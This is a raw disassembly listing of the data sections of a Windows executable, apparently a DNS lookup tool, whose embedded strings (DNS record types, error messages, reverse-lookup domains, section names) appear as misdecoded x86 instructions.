  403aab:	outs   dx,BYTE PTR ds:[esi]
  403aac:	je     0x403b0f
  403aae:	ins    BYTE PTR es:[edi],dx
  403aaf:	and    BYTE PTR [edx+0x6f],bh
  403ab2:	outs   dx,BYTE PTR ds:[esi]
  403ab3:	and    BYTE PTR gs:[edx+esi*2+0x61],dh
  403ab8:	outs   dx,BYTE PTR ds:[esi]
  403ab9:	jae    0x403b21
  403abb:	gs jb  0x403abe
  403abe:	add    BYTE PTR [eax],al
  403ac0:	inc    ecx
  403ac1:	pop    eax
  403ac2:	inc    esi
  403ac3:	push   edx
  403ac4:	add    BYTE PTR [eax],al
  403ac6:	add    BYTE PTR [eax],al
  403ac8:	jp     0x403b39
  403aca:	outs   dx,BYTE PTR ds:[esi]
  403acb:	and    BYTE PTR gs:[edx+esi*2+0x61],dh
  403ad0:	outs   dx,BYTE PTR ds:[esi]
  403ad1:	jae    0x403b39
  403ad3:	gs jb  0x403ad6
  403ad6:	add    BYTE PTR [eax],al
  403ad8:	dec    ebp
  403ad9:	inc    ecx
  403ada:	dec    ecx
  403adb:	dec    esp
  403adc:	inc    edx
  403add:	add    BYTE PTR [eax],al
  403adf:	add    BYTE PTR [ebp+0x61],ch
  403ae2:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x65722d78
  403aea:	ins    BYTE PTR es:[edi],dx
  403aeb:	popa   
  403aec:	je     0x403b53
  403aee:	and    BYTE PTR fs:[ecx+eiz*2+0x74],ah
  403af3:	popa   
  403af4:	add    BYTE PTR [eax],al
  403af6:	add    BYTE PTR [eax],al
  403af8:	dec    ebp
  403af9:	inc    ecx
  403afa:	dec    ecx
  403afb:	dec    esp
  403afc:	inc    ecx
  403afd:	add    BYTE PTR [eax],al
  403aff:	add    BYTE PTR [ebp+0x61],ch
  403b02:	imul   ebp,DWORD PTR [eax+eiz*1+0x61],0x746e6567
  403b0a:	add    BYTE PTR [eax],al
  403b0c:	popa   
  403b0d:	ins    BYTE PTR es:[edi],dx
  403b0e:	ins    BYTE PTR es:[edi],dx
  403b0f:	and    BYTE PTR [edx+0x65],dh
  403b12:	arpl   WORD PTR [edi+0x72],bp
  403b15:	fs jae 0x403b18
  403b18:	push   ebp
  403b19:	dec    ecx
  403b1a:	dec    esi
  403b1b:	inc    esi
  403b1c:	dec    edi
  403b1d:	add    BYTE PTR [eax],al
  403b1f:	add    BYTE PTR [ebp+0x73],dh
  403b22:	gs jb  0x403b45
  403b25:	imul   ebp,DWORD PTR [esi+0x66],0x616d726f
  403b2c:	je     0x403b97
  403b2e:	outs   dx,DWORD PTR ds:[esi]
  403b2f:	outs   dx,BYTE PTR ds:[esi]
  403b30:	add    BYTE PTR [eax],al
  403b32:	add    BYTE PTR [eax],al
  403b34:	push   ebp
  403b35:	dec    ecx
  403b36:	inc    esp
  403b37:	add    BYTE PTR [ebp+0x73],dh
  403b3a:	gs jb  0x403b5d
  403b3d:	dec    ecx
  403b3e:	inc    esp
  403b3f:	add    BYTE PTR [edi+0x49],al
  403b42:	inc    esp
  403b43:	add    BYTE PTR [edi+0x72],ah
  403b46:	outs   dx,DWORD PTR ds:[esi]
  403b47:	jne    0x403bb9
  403b49:	and    BYTE PTR [ecx+0x44],cl
  403b4c:	add    BYTE PTR [eax],al
  403b4e:	add    BYTE PTR [eax],al
  403b50:	inc    ecx
  403b51:	sub    eax,DWORD PTR [ecx+0x41]
  403b54:	inc    ecx
  403b55:	inc    ecx
  403b56:	add    BYTE PTR [eax],al
  403b58:	imul   ebp,DWORD PTR [esi+0x74],0x616e7265
  403b5f:	ins    BYTE PTR es:[edi],dx
  403b60:	and    BYTE PTR [ecx+edi*2+0x70],dh
  403b64:	and    BYTE PTR gs:[esi+0x6f],ah
  403b68:	jb     0x403b8a
  403b6a:	bound  ebp,QWORD PTR [edi+0x74]
  403b6d:	push   0x76504920
  403b72:	xor    al,0x20
  403b74:	popa   
  403b75:	outs   dx,BYTE PTR ds:[esi]
  403b76:	and    BYTE PTR fs:[ecx+0x50],cl
  403b7a:	jbe    0x403bb2
  403b7c:	and    BYTE PTR [ecx+0x64],al
  403b7f:	fs jb  0x403be7
  403b82:	jae    0x403bf7
  403b84:	gs jae 0x403b87
  403b87:	add    BYTE PTR [edx+0x53],dl
  403b8a:	inc    ecx
  403b8b:	das    
  403b8c:	dec    ebp
  403b8d:	inc    esp
  403b8e:	xor    eax,0x66694400
  403b93:	imul   sp,WORD PTR [ebp+0x2d],0x6548
  403b99:	ins    BYTE PTR es:[edi],dx
  403b9a:	ins    BYTE PTR es:[edi],dx
  403b9b:	ins    DWORD PTR es:[edi],dx
  403b9c:	popa   
  403b9d:	outs   dx,BYTE PTR ds:[esi]
  403b9e:	add    BYTE PTR [eax],al
  403ba0:	inc    esp
  403ba1:	push   ebx
  403ba2:	inc    ecx
  403ba3:	add    BYTE PTR [ebp+0x6c],al
  403ba6:	ins    BYTE PTR es:[edi],dx
  403ba7:	imul   esi,DWORD PTR [eax+0x74],0x63206369
  403bae:	jne    0x403c22
  403bb0:	jbe    0x403c17
  403bb2:	add    BYTE PTR [eax],al
  403bb4:	push   esp
  403bb5:	dec    esp
  403bb6:	push   ebx
  403bb7:	add    BYTE PTR [ebp+0x6d],ah
  403bba:	popa   
  403bbb:	imul   ebp,DWORD PTR [eax+eax*1+0x0],0x534e4400
  403bc3:	push   ebx
  403bc4:	inc    ebp
  403bc5:	inc    ebx
  403bc6:	add    BYTE PTR [eax],al
  403bc8:	dec    ecx
  403bc9:	push   eax
  403bca:	push   ebx
  403bcb:	inc    ebp
  403bcc:	inc    ebx
  403bcd:	add    BYTE PTR [eax],al
  403bcf:	add    BYTE PTR ds:0x2073372d,ah
  403bd5:	and    BYTE PTR ds:0x73,ah
  403bdb:	add    BYTE PTR [edx],cl
  403bdd:	inc    ecx
  403bde:	fs fs jb 0x403c47
  403be2:	jae    0x403c57
  403be4:	gs jae 0x403c21
  403be7:	add    BYTE PTR [edx],cl
  403be9:	inc    ecx
  403bea:	fs fs jb 0x403c53
  403bee:	jae    0x403c63
  403bf0:	cmp    al,BYTE PTR [eax]
  403bf2:	add    BYTE PTR [eax],al
  403bf4:	or     cl,BYTE PTR [ecx]
  403bf6:	add    BYTE PTR [eax],al
  403bf8:	and    eax,0x73252063
  403bfd:	add    BYTE PTR [eax],al
  403bff:	add    BYTE PTR [edx],cl
  403c01:	inc    ecx
  403c02:	ins    BYTE PTR es:[edi],dx
  403c03:	imul   esp,DWORD PTR [ecx+0x73],0x3a7365
  403c0a:	add    BYTE PTR [eax],al
  403c0c:	or     dl,BYTE PTR [ebx+0x65]
  403c0f:	jb     0x403c87
  403c11:	gs and BYTE PTR fs:[edx+0x79],ah
  403c16:	cmp    cl,BYTE PTR [edx]
  403c18:	add    BYTE PTR [eax],al
  403c1a:	add    BYTE PTR [eax],al
  403c1c:	sub    eax,0xa732520
  403c21:	or     DWORD PTR [eax],eax
  403c23:	add    BYTE PTR [edx],cl
  403c25:	or     al,BYTE PTR [eax]
  403c27:	add    BYTE PTR [esi],bh
  403c29:	and    BYTE PTR ds:0x73,ah
  403c30:	popa   
  403c31:	sub    eax,DWORD PTR [eax]
  403c33:	add    BYTE PTR [esi],bh
  403c35:	and    BYTE PTR ds:0x73,ah
  403c3b:	add    BYTE PTR [edi+0x0],dh
  403c3e:	add    BYTE PTR [eax],al
  403c40:	push   ebx
  403c41:	jne    0x403ca6
  403c43:	arpl   WORD PTR [ebp+0x73],sp
  403c46:	jae    0x403c48
  403c48:	inc    esi
  403c49:	outs   dx,DWORD PTR ds:[esi]
  403c4a:	jb     0x403cb9
  403c4c:	popa   
  403c4d:	je     0x403c6f
  403c4f:	gs jb  0x403cc4
  403c52:	outs   dx,DWORD PTR ds:[esi]
  403c53:	jb     0x403c55
  403c55:	add    BYTE PTR [eax],al
  403c57:	add    BYTE PTR [ebx+0x65],dl
  403c5a:	jb     0x403cd2
  403c5c:	gs jb  0x403c7f
  403c5f:	popaw  
  403c61:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x4e000000
  403c69:	outs   dx,DWORD PTR ds:[esi]
  403c6a:	outs   dx,BYTE PTR ds:[esi]
  403c6b:	sub    eax,0x73697865
  403c70:	je     0x403cd7
  403c72:	outs   dx,BYTE PTR ds:[esi]
  403c73:	je     0x403c95
  403c75:	outs   dx,DWORD PTR fs:[esi]
  403c77:	ins    DWORD PTR es:[edi],dx
  403c78:	popa   
  403c79:	imul   ebp,DWORD PTR [esi+0x0],0x20746f4e
  403c80:	imul   ebp,DWORD PTR [ebp+0x70],0x656d656c
  403c87:	outs   dx,BYTE PTR ds:[esi]
  403c88:	je     0x403cef
  403c8a:	add    BYTE PTR fs:[ecx+0x75],dl
  403c8e:	gs jb  0x403d0a
  403c91:	and    BYTE PTR [edx+0x65],dh
  403c94:	data16 jne 0x403d0a
  403c97:	gs add BYTE PTR fs:[eax],al
  403c9b:	add    BYTE PTR [esi+0x6f],cl
  403c9e:	and    BYTE PTR [ebx+0x68],ah
  403ca1:	popa   
  403ca2:	outs   dx,BYTE PTR ds:[esi]
  403ca3:	add    BYTE PTR gs:[bx+si],al
  403ca7:	add    BYTE PTR [ecx+ebp*2+0x6d],dl
  403cab:	gs and BYTE PTR fs:[edi+0x75],ch
  403cb0:	je     0x403cb2
  403cb2:	add    BYTE PTR [eax],al
  403cb4:	dec    esi
  403cb5:	outs   dx,DWORD PTR ds:[esi]
  403cb6:	and    BYTE PTR [ecx+0x6e],ch
  403cb9:	outs   dx,WORD PTR ds:[esi]
  403cbb:	jb     0x403d2a
  403cbd:	popa   
  403cbe:	je     0x403d29
  403cc0:	outs   dx,DWORD PTR ds:[esi]
  403cc1:	outs   dx,BYTE PTR ds:[esi]
  403cc2:	add    BYTE PTR [eax],al
  403cc4:	push   ebp
  403cc5:	outs   dx,BYTE PTR ds:[esi]
  403cc6:	jae    0x403d38
  403cc8:	arpl   WORD PTR gs:[ecx+0x66],bp
  403ccc:	imul   esp,DWORD PTR [ebp+0x64],0x72726520
  403cd3:	outs   dx,DWORD PTR ds:[esi]
  403cd4:	jb     0x403cd6
  403cd6:	add    BYTE PTR [eax],al
  403cd8:	dec    esi
  403cd9:	outs   dx,DWORD PTR ds:[esi]
  403cda:	outs   dx,BYTE PTR ds:[esi]
  403cdb:	sub    eax,0x68747561
  403ce0:	outs   dx,DWORD PTR ds:[esi]
  403ce1:	jb     0x403d4c
  403ce3:	je     0x403d46
  403ce5:	je     0x403d50
  403ce7:	jbe    0x403d4e
  403ce9:	and    BYTE PTR [ecx+0x6e],ah
  403cec:	jae    0x403d65
  403cee:	gs jb  0x403cf1
  403cf1:	add    BYTE PTR [eax],al
  403cf3:	add    BYTE PTR [esi+0x6f],cl
  403cf6:	and    BYTE PTR [edx+0x65],dh
  403cf9:	jae    0x403d6b
  403cfb:	outs   dx,DWORD PTR ds:[esi]
  403cfc:	outs   dx,BYTE PTR ds:[esi]
  403cfd:	jae    0x403d64
  403cff:	and    BYTE PTR [esi+0x72],ah
  403d02:	outs   dx,DWORD PTR ds:[esi]
  403d03:	ins    DWORD PTR es:[edi],dx
  403d04:	and    BYTE PTR [ebx+0x65],dh
  403d07:	jb     0x403d7f
  403d09:	gs jb  0x403d0c
  403d0c:	inc    edx
  403d0d:	inc    ecx
  403d0e:	inc    esp
  403d0f:	and    BYTE PTR [ebp+0x52],al
  403d12:	push   edx
  403d13:	dec    edi
  403d14:	push   edx
  403d15:	and    BYTE PTR [esi+0x41],dl
  403d18:	dec    esp
  403d19:	push   ebp
  403d1a:	inc    ebp
  403d1b:	add    BYTE PTR [eax+0x45],cl
  403d1e:	push   ebx
  403d1f:	dec    ecx
  403d20:	dec    edi
  403d21:	inc    esp
  403d22:	add    BYTE PTR [eax],al
  403d24:	jne    0x403d94
  403d26:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  403d2a:	outs   dx,BYTE PTR ds:[esi]
  403d2b:	and    BYTE PTR [ecx+0x75],dh
  403d2e:	gs jb  0x403daa
  403d31:	and    BYTE PTR [ebx+0x6c],ah
  403d34:	popa   
  403d35:	jae    0x403daa
  403d37:	cmp    ah,BYTE PTR [eax]
  403d39:	and    eax,0xa73
  403d3e:	add    BYTE PTR [eax],al
  403d40:	jne    0x403db0
  403d42:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  403d46:	outs   dx,BYTE PTR ds:[esi]
  403d47:	and    BYTE PTR [ecx+0x75],dh
  403d4a:	gs jb  0x403dc6
  403d4d:	and    BYTE PTR [ecx+edi*2+0x70],dh
  403d51:	cmp    ah,BYTE PTR gs:[eax]
  403d54:	and    eax,0x3c000a73
  403d59:	add    BYTE PTR [esi+0x0],cl
  403d5c:	push   ebp
  403d5d:	add    BYTE PTR [eax+eax*1+0x4c],cl
  403d61:	add    BYTE PTR [esi],bh
  403d63:	add    BYTE PTR [eax],al
  403d65:	add    BYTE PTR [eax],al
  403d67:	add    BYTE PTR [esi+0x0],cl
  403d6a:	push   ebp
  403d6b:	add    BYTE PTR [eax+eax*1+0x4c],cl
  403d6f:	add    BYTE PTR [eax],al
  403d71:	add    BYTE PTR [eax],al
  403d73:	add    BYTE PTR ds:0x75252e75,ah
  403d79:	cs and eax,0x75252e75
  403d7f:	add    BYTE PTR [ecx+0x6e],cl
  403d82:	jbe    0x403de5
  403d84:	ins    BYTE PTR es:[edi],dx
  403d85:	imul   esp,DWORD PTR [eax+eiz*1+0x44],0x415f534e
  403d8d:	inc    esp
  403d8e:	inc    esp
  403d8f:	push   edx
  403d90:	and    BYTE PTR [ecx+0x74],ah
  403d93:	and    BYTE PTR ds:0x25000070,ah
  403d99:	jne    0x403dc9
  403d9b:	and    eax,0x75252e75
  403da0:	cs and eax,0x6e692e75
  403da6:	sub    eax,0x72646461
  403dab:	cs popa 
  403dad:	jb     0x403e1f
  403daf:	popa   
  403db0:	add    BYTE PTR cs:[eax],al
  403db3:	add    BYTE PTR ds:0x78252e78,ah
  403db9:	add    BYTE PTR cs:[eax],al
  403dbc:	imul   esi,DWORD PTR [eax+0x36],0x7072612e
  403dc3:	popa   
  403dc4:	add    BYTE PTR cs:[eax],al
  403dc7:	add    BYTE PTR [eax],al
  403dc9:	add    BYTE PTR [eax],al
  403dcb:	add    al,dh
  403dcd:	xchg   DWORD PTR [esi],esp
  403dcf:	(bad)
  403dd2:	mov    bh,0x91
  403dd4:	aaa    
  403dd5:	js     0x403d96
  403dd7:	inc    ebx
  403dd8:	or     eax,DWORD PTR [ebp+eiz*2+0x1]
  403ddc:	and    eax,0x20783230
  403de1:	add    BYTE PTR [eax],al
  403de3:	add    BYTE PTR ds:0x732573,ah
  403de9:	add    BYTE PTR [eax],al
  403deb:	add    BYTE PTR ds:0x34250973,ah
  403df1:	fs and BYTE PTR ds:[eax],al
  403df5:	add    BYTE PTR [eax],al
  403df7:	add    BYTE PTR ds:0x2a2e2573,ah
  403dfd:	jae    0x403e0c
  403dff:	or     al,BYTE PTR [eax]
  403e01:	add    BYTE PTR [eax],al
  403e03:	add    BYTE PTR [esi+0x75],cl
  403e06:	ins    BYTE PTR es:[edi],dx
  403e07:	ins    BYTE PTR es:[edi],dx
  403e08:	and    BYTE PTR [ecx+0x64],al
  403e0b:	fs jb  0x403e73
  403e0e:	jae    0x403e83
  403e10:	add    BYTE PTR [eax],al
  403e12:	add    BYTE PTR [eax],al
  403e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e15:	pop    ss
  403e16:	repz xchg ebp,eax
  403e18:	cld    
  403e19:	adc    al,0x56
  403e1b:	sub    al,0xf2
  403e1d:	dec    eax
  403e1e:	push   ds
  403e1f:	mov    bl,0x6b
  403e21:	add    eax,DWORD PTR [ebx]
  403e23:	adc    eax,DWORD PTR [eax]
	...
  403e2d:	add    BYTE PTR [eax],al
  403e2f:	add    BYTE PTR [ecx+0x42],al
  403e32:	inc    ebx
  403e33:	inc    esp
  403e34:	inc    ebp
  403e35:	inc    esi
  403e36:	inc    edi
  403e37:	dec    eax
  403e38:	dec    ecx
  403e39:	dec    edx
  403e3a:	dec    ebx
  403e3b:	dec    esp
  403e3c:	dec    ebp
  403e3d:	dec    esi
  403e3e:	dec    edi
  403e3f:	push   eax
  403e40:	push   ecx
  403e41:	push   edx
  403e42:	push   ebx
  403e43:	push   esp
  403e44:	push   ebp
  403e45:	push   esi
  403e46:	push   edi
  403e47:	pop    eax
  403e48:	pop    ecx
  403e49:	pop    edx
  403e4a:	popa   
  403e4b:	bound  esp,QWORD PTR [ebx+0x64]
  403e4e:	gs addr16 pushw 0x6a69
  403e54:	imul   ebp,DWORD PTR [ebp+ebp*2+0x6e],0x6f
  403e59:	jo     0x403ecc
  403e5b:	jb     0x403ed0
  403e5d:	je     0x403ed4
  403e5f:	jbe    0x403ed8
  403e61:	js     0x403edc
  403e63:	jp     0x403e95
  403e65:	xor    DWORD PTR [edx],esi
  403e67:	xor    esi,DWORD PTR [esi*1+0x39383736]
  403e6e:	sub    ebp,DWORD PTR [edi]
  403e70:	add    al,BYTE PTR [eax]
  403e72:	add    DWORD PTR [eax],eax
  403e74:	add    al,0x0
  403e76:	add    BYTE PTR [eax],al
  403e78:	adc    BYTE PTR [eax],al
  403e7a:	add    BYTE PTR [eax],al
  403e7c:	add    al,0x0
  403e7e:	add    BYTE PTR [eax],al
  403e80:	pop    ss
  403e81:	add    BYTE PTR [eax+eax*1],bl
  403e84:	adc    BYTE PTR [eax],al
  403e86:	add    BYTE PTR [eax],al
  403e88:	sbb    al,0x0
  403e8a:	add    BYTE PTR [eax],al
  403e8c:	or     BYTE PTR [eax],al
  403e8e:	add    BYTE PTR [eax],al
  403e90:	push   ss
  403e91:	add    BYTE PTR [edx],ah
  403e93:	add    BYTE PTR [eax+eax*1],bl
  403e96:	add    BYTE PTR [eax],al
  403e98:	dec    esp
  403e99:	add    BYTE PTR [eax],al
  403e9b:	add    BYTE PTR [eax+eax*1],al
  403e9e:	add    BYTE PTR [eax],al
  403ea0:	add    al,0x0
	...
  403ec2:	add    BYTE PTR [eax],al
  403ec4:	add    BYTE PTR [edi+ebx*4],bh
  403ec7:	push   ebp
  403ec8:	add    BYTE PTR [eax],al
  403eca:	add    BYTE PTR [eax],al
  403ecc:	add    al,BYTE PTR [eax]
  403ece:	add    BYTE PTR [eax],al
  403ed0:	and    eax,0x84000000
  403ed5:	aas    
  403ed6:	add    BYTE PTR [eax],al
  403ed8:	test   BYTE PTR [ebx],dh
  403eda:	add    BYTE PTR [eax],al
  403edc:	add    BYTE PTR [eax],al
  403ede:	add    BYTE PTR [eax],al
  403ee0:	add    BYTE PTR [edi+ebx*4],bh
  403ee3:	push   ebp
  403ee4:	add    BYTE PTR [eax],al
  403ee6:	add    BYTE PTR [eax],al
  403ee8:	or     eax,0x40000000
  403eed:	add    al,BYTE PTR [eax]
  403eef:	add    al,al
  403ef1:	aas    
  403ef2:	add    BYTE PTR [eax],al
  403ef4:	shl    BYTE PTR [ebx],0x0
	...
  403f17:	add    BYTE PTR [eax+0x0],ch
	...
  403f52:	add    BYTE PTR [eax],al
  403f54:	add    al,0xe0
  403f56:	inc    eax
  403f57:	add    BYTE PTR [eax+0x100403f],al
  403f5d:	add    BYTE PTR [eax],al
  403f5f:	add    ah,dh
  403f61:	xor    DWORD PTR [ecx+0x0],eax
  403f64:	add    BYTE PTR [eax],al
  403f66:	add    BYTE PTR [eax],al
  403f68:	sbb    al,0x10
  403f6a:	inc    eax
  403f6b:	add    BYTE PTR [ebx],cl
  403f6d:	add    BYTE PTR [eax],al
  403f6f:	add    BYTE PTR [eax],al
  403f71:	xor    eax,0x0
	...
  403f7e:	add    BYTE PTR [eax],al
  403f80:	lock rol BYTE PTR [eax],cl
  403f83:	add    BYTE PTR [edx+0x53],dl
  403f86:	inc    esp
  403f87:	push   ebx
  403f88:	movaps XMMWORD PTR ds:[ebx-0x36],xmm2
  403f8d:	mov    ds:0x86b24d30,eax
  403f92:	fisttp WORD PTR [eax]
  403f94:	mov    eax,0x1c59790
  403f99:	add    BYTE PTR [eax],al
  403f9b:	add    BYTE PTR [esi+0x73],ch
  403f9e:	ins    BYTE PTR es:[edi],dx
  403f9f:	outs   dx,DWORD PTR ds:[esi]
  403fa0:	outs   dx,DWORD PTR ds:[esi]
  403fa1:	imul   esi,DWORD PTR [ebp+0x70],0x2e
  403fa5:	jo     0x40400b
  403fa7:	bound  eax,QWORD PTR [eax]
	...
  403fbd:	add    BYTE PTR [eax],al
  403fbf:	add    BYTE PTR [edi+0x43],al
  403fc2:	push   esp
  403fc3:	dec    esp
  403fc4:	add    BYTE PTR [eax],dl
  403fc6:	add    BYTE PTR [eax],al
  403fc8:	add    al,0x0
  403fca:	add    BYTE PTR [eax],al
  403fcc:	cs inc ebx
  403fce:	push   edx
  403fcf:	push   esp
  403fd0:	and    al,0x58
  403fd2:	inc    ebx
  403fd3:	inc    ecx
  403fd4:	add    BYTE PTR [eax],al
  403fd6:	add    BYTE PTR [eax],al
  403fd8:	add    al,0x10
  403fda:	add    BYTE PTR [eax],al
  403fdc:	add    al,0x0
  403fde:	add    BYTE PTR [eax],al
  403fe0:	cs inc ebx
  403fe2:	push   edx
  403fe3:	push   esp
  403fe4:	and    al,0x58
  403fe6:	inc    ebx
  403fe7:	inc    ecx
  403fe8:	inc    ecx
  403fe9:	add    BYTE PTR [eax],al
  403feb:	add    BYTE PTR [eax],cl
  403fed:	adc    BYTE PTR [eax],al
  403fef:	add    BYTE PTR [eax+eax*1],al
  403ff2:	add    BYTE PTR [eax],al
  403ff4:	cs inc ebx
  403ff6:	push   edx
  403ff7:	push   esp
  403ff8:	and    al,0x58
  403ffa:	inc    ebx
  403ffb:	pop    edx
  403ffc:	add    BYTE PTR [eax],al
  403ffe:	add    BYTE PTR [eax],al
  404000:	or     al,0x10
  404002:	add    BYTE PTR [eax],al
  404004:	add    al,0x0
  404006:	add    BYTE PTR [eax],al
  404008:	cs inc ebx
  40400a:	push   edx
  40400b:	push   esp
  40400c:	and    al,0x58
  40400e:	dec    ecx
  40400f:	inc    ecx
  404010:	add    BYTE PTR [eax],al
  404012:	add    BYTE PTR [eax],al
  404014:	adc    BYTE PTR [eax],dl
  404016:	add    BYTE PTR [eax],al
  404018:	add    al,0x0
  40401a:	add    BYTE PTR [eax],al
  40401c:	cs inc ebx
  40401e:	push   edx
  40401f:	push   esp
  404020:	and    al,0x58
  404022:	dec    ecx
  404023:	inc    ecx
  404024:	inc    ecx
  404025:	add    BYTE PTR [eax],al
  404027:	add    BYTE PTR [eax+edx*1],dl
  40402a:	add    BYTE PTR [eax],al
  40402c:	add    al,0x0
  40402e:	add    BYTE PTR [eax],al
  404030:	cs inc ebx
  404032:	push   edx
  404033:	push   esp
  404034:	and    al,0x58
  404036:	dec    ecx
  404037:	pop    ecx
  404038:	add    BYTE PTR [eax],al
  40403a:	add    BYTE PTR [eax],al
  40403c:	sbb    BYTE PTR [eax],dl
  40403e:	add    BYTE PTR [eax],al
  404040:	add    al,0x0
  404042:	add    BYTE PTR [eax],al
  404044:	cs inc ebx
  404046:	push   edx
  404047:	push   esp
  404048:	and    al,0x58
  40404a:	dec    ecx
  40404b:	pop    edx
  40404c:	add    BYTE PTR [eax],al
  40404e:	add    BYTE PTR [eax],al
  404050:	sbb    al,0x10
  404052:	add    BYTE PTR [eax],al
  404054:	sub    al,0x0
  404056:	add    BYTE PTR [eax],al
  404058:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  404060:	add    BYTE PTR [eax],al
  404062:	add    BYTE PTR [eax],al
  404064:	push   eax
  404065:	adc    BYTE PTR [eax],al
  404067:	add    BYTE PTR [eax],dh
  404069:	das    
  40406a:	add    BYTE PTR [eax],al
  40406c:	cs jb  0x4040d3
  40406f:	popa   
  404070:	je     0x4040d3
  404072:	add    BYTE PTR [eax],al
  404074:	cmp    BYTE PTR [edi],0x0
  404077:	add    BYTE PTR [eax+eax*1],al
  40407a:	add    BYTE PTR [eax],al
  40407c:	cs jb  0x4040e3
  40407f:	popa   
  404080:	je     0x4040e3
  404082:	and    al,0x73
  404084:	js     0x4040ea
  404086:	popa   
  404087:	je     0x4040ea
  404089:	add    BYTE PTR [eax],al
  40408b:	add    BYTE PTR [edi+edi*1+0x27c0000],al
  404092:	add    BYTE PTR [eax],al
  404094:	cs jb  0x4040fb
  404097:	popa   
  404098:	je     0x4040fb
  40409a:	and    al,0x7a
  40409c:	jp     0x404118
  40409e:	bound  esp,QWORD PTR fs:[edi+0x0]
  4040a2:	add    BYTE PTR [eax],al
  4040a4:	add    BYTE PTR [edx+0x0],al
  4040a7:	add    BYTE PTR [esi+0x2e000092],ch
  4040ad:	je     0x404114
  4040af:	js     0x404125
  4040b1:	and    al,0x6d
  4040b3:	outs   dx,BYTE PTR ds:[esi]
  4040b4:	add    BYTE PTR [eax],al
  4040b6:	add    BYTE PTR [eax],al
  4040b8:	mov    al,0xd4
  4040ba:	add    BYTE PTR [eax],al
  4040bc:	pop    esp
  4040bd:	add    BYTE PTR [eax],al
  4040bf:	add    BYTE PTR [esi],ch
  4040c1:	js     0x404127
  4040c3:	popa   
  4040c4:	je     0x404127
  4040c6:	and    al,0x78
  4040c8:	add    BYTE PTR [eax],al
  4040ca:	add    BYTE PTR [eax],al
  4040cc:	or     al,0xd5
  4040ce:	add    BYTE PTR [eax],al
  4040d0:	and    BYTE PTR [eax],al
  4040d2:	add    BYTE PTR [eax],al
  4040d4:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3224
  4040de:	add    BYTE PTR [eax],al
  4040e0:	sub    al,0xd5
  4040e2:	add    BYTE PTR [eax],al
  4040e4:	and    BYTE PTR [eax],al
  4040e6:	add    BYTE PTR [eax],al
  4040e8:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3324
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	dec    esp
  4040f5:	aad    0x0
  4040f7:	add    BYTE PTR [eax],cl
  4040f9:	add    BYTE PTR [eax],al
  4040fb:	add    BYTE PTR [esi],ch
  4040fd:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3424
  404106:	add    BYTE PTR [eax],al
  404108:	push   esp
  404109:	aad    0x0
  40410b:	add    BYTE PTR [edx],dl
  40410d:	add    BYTE PTR [eax],al
  40410f:	add    BYTE PTR [esi],ch
  404111:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3624
  40411a:	add    BYTE PTR [eax],al
  40411c:	push   0x80000d5
  404121:	add    BYTE PTR [eax],al
  404123:	add    BYTE PTR [esi],ch
  404125:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3724
  40412e:	add    BYTE PTR [eax],al
  404130:	add    al,ah
  404132:	add    BYTE PTR [eax],al
  404134:	jo     0x40416e
  404136:	add    BYTE PTR [eax],al
  404138:	cs fs popa 
  40413b:	je     0x40419e
  40413d:	add    BYTE PTR [eax],al
  40413f:	add    BYTE PTR [eax-0x7ffffee8],al
  404145:	adc    BYTE PTR [eax],al
  404147:	add    BYTE PTR [esi],ch
  404149:	bound  esi,QWORD PTR [ebx+0x73]
  40414c:	add    BYTE PTR [eax],al
  40414e:	add    BYTE PTR [eax],al
  404150:	add    BYTE PTR [eax],dh
  404152:	add    DWORD PTR [eax],eax
  404154:	hlt    
  404155:	add    DWORD PTR [eax],eax
  404157:	add    BYTE PTR [esi],ch
  404159:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  404161:	add    BYTE PTR [eax],al
  404163:	add    ah,dh
  404165:	xor    DWORD PTR [ecx],eax
  404167:	add    BYTE PTR [eax+eax*1],al
  40416a:	add    BYTE PTR [eax],al
  40416c:	xor    BYTE PTR cs:[eax],dh
  40416f:	arpl   WORD PTR [esi+0x67],sp
  404172:	add    BYTE PTR [eax],al
  404174:	clc    
  404175:	xor    DWORD PTR [ecx],eax
  404177:	add    BYTE PTR [eax+0x1],ch
  40417a:	add    BYTE PTR [eax],al
  40417c:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  404185:	add    BYTE PTR [eax],al
  404187:	add    BYTE PTR [eax+0x33],ah
  40418a:	add    DWORD PTR [eax],eax
  40418c:	adc    al,0x0
  40418e:	add    BYTE PTR [eax],al
  404190:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  404199:	add    BYTE PTR [eax],al
  40419b:	add    BYTE PTR [ebx+esi*1+0x1],dh
  40419f:	add    ah,dh
  4041a1:	add    DWORD PTR [eax],eax
  4041a3:	add    BYTE PTR [esi],ch
  4041a5:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  4041ad:	add    BYTE PTR [eax],al
  4041af:	add    BYTE PTR [eax+0x35],ch
  4041b2:	add    DWORD PTR [eax],eax
  4041b4:	fiadd  WORD PTR [edi]
  4041b6:	add    BYTE PTR [eax],al
  4041b8:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  4041c1:	add    BYTE PTR [eax],al
  4041c3:	add    BYTE PTR [eax],al
  4041c5:	inc    eax
  4041c6:	add    DWORD PTR [eax],eax
  4041c8:	or     BYTE PTR [eax],al
  4041ca:	add    BYTE PTR [eax],al
  4041cc:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3524
  4041d6:	add    BYTE PTR [eax],al
  4041d8:	add    BYTE PTR [eax+0x1],dl
  4041db:	add    ah,cl
  4041dd:	add    DWORD PTR [eax],eax
  4041df:	add    BYTE PTR [esi],ch
  4041e1:	jb     0x404256
  4041e3:	jb     0x404248
  4041e5:	and    al,0x30
  4041e7:	xor    DWORD PTR [eax],eax
  4041e9:	add    BYTE PTR [eax],al
  4041eb:	add    al,dl
  4041ed:	push   ecx
